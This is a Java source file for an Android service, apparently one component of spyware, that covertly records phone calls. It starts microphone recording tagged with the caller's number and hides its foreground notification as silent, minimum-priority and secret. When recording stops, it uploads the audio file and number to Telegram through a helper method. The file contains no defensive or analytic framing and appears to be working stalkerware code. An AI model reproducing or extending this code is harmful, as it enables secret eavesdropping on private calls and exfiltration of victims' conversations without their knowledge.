package com.smshandler;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.File;

public class CallRecordingService extends Service {

    private MediaRecorder mRecorder;
    private String        mFile;
    private String        mNumber = "Unknown";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopRec();
            return START_NOT_STICKY;
        }
        if (intent != null) {
            String n = intent.getStringExtra("call_number");
            if (n != null) mNumber = n;
        }
        startForeground(9903, buildNotif());
        startRec();
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, SmsService.CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private void startRec() {
        try {
            File dir = getExternalFilesDir(null);
            if (dir == null) dir = getFilesDir();
            mFile = dir.getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setOutputFile(mFile);
            mRecorder.prepare();
            mRecorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopRec() {
        if (mRecorder != null) {
            try { mRecorder.stop(); } catch (Exception ignored) {}
            mRecorder.release();
            mRecorder = null;
            String f = mFile, n = mNumber;
            new Thread(() -> {
                try {
                    File file = new File(f);
                    if (file.exists() && file.length() > 500) {
                        SmsService.sendFileToTelegram(file, "🎙 Call Recording\nWith: " + n);
                    } else {
                        if (file.exists()) file.delete();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (mRecorder != null) {
            try { mRecorder.stop(); mRecorder.release(); } catch (Exception e) {}
            mRecorder = null;
        }
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
